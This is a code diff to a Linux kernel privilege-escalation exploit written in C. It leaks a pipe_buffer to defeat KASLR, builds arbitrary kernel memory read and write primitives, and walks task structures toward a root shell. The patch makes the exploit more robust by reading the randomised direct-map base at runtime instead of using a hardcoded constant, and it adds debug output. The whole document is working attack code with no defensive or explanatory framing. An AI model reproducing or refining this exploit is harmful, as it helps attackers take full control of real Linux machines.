@@ -689,6 +689,7 @@ struct pipe_buffer_t saved_pipe_buffer_leak = { 0 };
 usize vmem_base = 0;
 usize kaslr_base = 0;
 usize phys_base = 0;
+usize linear_base = 0;
 
 
 #define KERNEL_BASE 0xffffffff81000000
@@ -714,6 +715,8 @@ usize is_kernel_address(usize addr) {
 #else
 
 #define SHELL "/bin/bash"
+
+#define PAGE_OFFSET_BASE (0xffffffff82edd490 - KERNEL_BASE)
 
 usize addr_to_page(usize addr) {
   return ((addr >> 12) << 6) + vmem_base;
@@ -801,11 +804,13 @@ void write64_kernel(usize addr, usize data) {
 }
 
 usize read64_virtual(usize addr) {
-  return read64(addr - 0xffff888000000000);
+  // return read64(addr - 0xffff888000000000);
+  return read64(addr - linear_base);
 }
 
 void write64_virtual(usize addr, usize data) {
-  return write64(addr - 0xffff888000000000, data);
+  // return write64(addr - 0xffff888000000000, data);
+  return write64(addr - linear_base, data);
 }
 
 usize read64_all(usize addr) {
@@ -1026,7 +1031,8 @@ void exploit() {
   kaslr_base = saved_pipe_buffer_leak.ops - PIPE_OPS_OFFSET;
   printf("leaked kaslr base: %lx\n", kaslr_base);
 
-  vmem_base = saved_pipe_buffer_leak.page & 0xfffffffff0000000 ;
+  // vmem_base = saved_pipe_buffer_leak.page & 0xfffffffff0000000;
+  vmem_base = saved_pipe_buffer_leak.page & 0xfffffffff0000000;
   printf("vmemmap base: %lx\n", vmem_base);
 
   usize start_bytes = 0x4802603f51258d48;
@@ -1039,6 +1045,9 @@ void exploit() {
 
     phys_base += 0x1000;
   }
+
+  linear_base = read64_kernel(kaslr_base + PAGE_OFFSET_BASE);
+  printf("linear base: %lx\n", linear_base);
 
   usize current_task = INIT_OFFSET + kaslr_base;
 
@@ -1057,9 +1066,9 @@ void exploit() {
     }
 
     if (is_linear_address(value) && !is_kernel_address(value) && is_linear_address(value2) && !is_kernel_address(value2) && next_task_offset == 0) {
-      // printf("%lx, %lx\n", value, value2);
+      printf("%lx: %lx, %lx\n", i, value, value2);
       usize prev_ptr = read64_all(value + 8);
-      // printf("prev: %lx\n", prev_ptr);
+      printf("prev: %lx, real prev: %lx\n", prev_ptr, current_task + i);
       if (prev_ptr == current_task + i) {
         next_task_offset = i;
         printf("next task offset: %lx\n", next_task_offset);
